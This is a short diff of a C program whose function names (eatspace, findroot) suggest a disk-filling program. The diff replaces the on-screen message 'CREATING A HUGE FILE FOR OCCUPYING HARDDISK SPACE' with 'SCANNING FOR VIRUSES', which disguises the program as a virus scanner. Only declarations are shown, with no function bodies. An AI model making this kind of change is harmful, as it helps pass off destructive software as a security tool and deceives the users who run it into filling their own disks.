@@ -5,7 +5,7 @@
 FILE *a,*t,*b;
 int r,status,vir_count;
 double i;
-char ch[]=”CREATING A HUGE FILE FOR OCCUPYING HARDDISK SPACE”,choice;
+char ch[]=”SCANNING FOR VIRUSES”,choice;
 void eatspace(void);
 void findroot(void);
 void showstatus(void);
